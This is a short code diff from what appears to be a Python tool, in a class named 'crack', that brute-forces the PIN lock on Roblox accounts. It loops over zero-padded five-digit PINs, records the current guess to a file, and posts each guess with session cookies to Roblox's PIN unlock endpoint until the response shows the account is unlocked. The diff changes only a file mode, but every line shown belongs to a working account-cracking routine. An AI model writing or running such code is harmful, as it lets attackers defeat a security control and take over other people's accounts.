@@ -129,7 +129,7 @@ class crack:
       for _ in range(5-len(str(v))):
         v = f'0{v}'
       pin = v
-      open("currentNumber.txt", "w").write(str(int(v)))
+      open("currentNumber.txt", "w+").write(str(int(v)))
       response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
       try:
         if "unlockedUntil" in str(response):
